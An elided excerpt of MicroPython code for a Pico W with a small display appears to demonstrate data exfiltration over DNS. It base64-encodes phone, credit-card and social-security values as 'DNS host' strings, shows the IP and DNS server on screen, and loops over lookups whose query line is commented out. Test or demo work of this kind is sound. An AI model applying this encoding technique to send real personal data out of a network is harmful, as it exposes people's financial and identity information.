...
#I'm only using BLACK and CYAN at the moment
...
#Encode and display (on console, NOT on Pico Display) DNS host variable in base64
b64_phone = ubinascii.b2a_base64(phone_number)
b64_phone = b64_phone.rstrip(b'\n')  # Remove trailing newline
b64_phone = b64_phone.decode('utf-8')  # Convert bytes to string

b64_cc1 = ubinascii.b2a_base64(credit_card_1)
b64_cc1 = b64_cc1.rstrip(b'\n')  # Remove trailing newline
b64_cc1 = b64_cc1.decode('utf-8')  # Convert bytes to string

b64_cc2 = ubinascii.b2a_base64(credit_card_2)
b64_cc2 = b64_cc2.rstrip(b'\n')  # Remove trailing newline
b64_cc2 = b64_cc2.decode('utf-8')  # Convert bytes to string

b64_ssn1 = ubinascii.b2a_base64(ssn_1)
b64_ssn1 = b64_ssn1.rstrip(b'\n')  # Remove trailing newline
b64_ssn1 = b64_ssn1.decode('utf-8')  # Convert bytes to string

b64_ssn2 = ubinascii.b2a_base64(ssn_2)
b64_ssn2 = b64_ssn2.rstrip(b'\n')  # Remove trailing newline
b64_ssn2 = b64_ssn2.decode('utf-8')  # Convert bytes to string
...
if wlan.status() != 3:
     ...
     print( 'IP = ' + status[0] )
     #myip = ip_octets[2] + "." + ip_octets[3]					#Assign ip last two octets to a variable so it can be called by pico display (can't fit entire ip address on screen)
     clear()													#Display ip address on console and on pico display
     display.set_pen(CYAN)
     display.text("IP: " + str(ip_octets), 10, 10, 240, 4)		#Display full IP address
     #display.text("IP: " + str(ip_octets[2]) + "." + str(ip_octets[3]), 10, 10, 240, 4)  #This is for smaller display
     display.update()
     time.sleep(3)												#Hold display for 2 seconds before clearing
     clear()
     #from machine import Pin									#Section to blink the back led 5 times. This can be commented out when using the pico display
     #led = Pin("LED", Pin.OUT)
     #num_blinks = 5
     #for i in range(num_blinks):
         #led.toggle()  # Turn the LED on (LEDs on Pico W are active-low)
...
#mydns = dns_octets[2] + "." + dns_octets[3]
...
display.set_pen(CYAN)
#display.text("DNS Server: " + str(dns_octets[2]) + "." + str(dns_octets[3]), 10, 10, 240, 4)
...
for i in range(5):
    ...
    try:
        #ip_address = socket.getaddrinfo(domain, 0)[0][4][0]
        ...
        time.sleep(5)
        clear()
        #from machine import Pin								#Blink back LED 3 times to signal DNS Query sent. Comment out if using pico display
        #led = Pin("LED", Pin.OUT)
        #num_blinks = 3
        #for i in range(num_blinks):
             #led.toggle()  # Turn the LED on (LEDs on Pico W are active-low)
    ...
    #Insert a 1-second paused between iterations
    time.sleep(1)  
